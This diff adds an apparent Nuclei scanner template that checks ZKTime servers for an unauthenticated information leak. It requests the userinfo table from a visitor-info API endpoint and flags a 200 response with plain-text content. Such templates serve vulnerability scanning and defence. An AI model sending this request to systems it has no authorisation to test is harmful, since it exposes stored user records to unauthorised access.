@@ -1,0 +1,25 @@
+id: ZkTime-get_visitor_info-InfoLeak
+
+info:
+  name: ZkTime-get_visitor_info-InfoLeak
+  author: iSee857
+  severity: high
+  description: |
+    ZkTime-get_visitor_info-InfoLeak
+
+http:
+  - raw:
+      - |
+        GET /api/get_visitor_info?table=userinfo HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+          
+      - type: status
+        status:
+          - 200
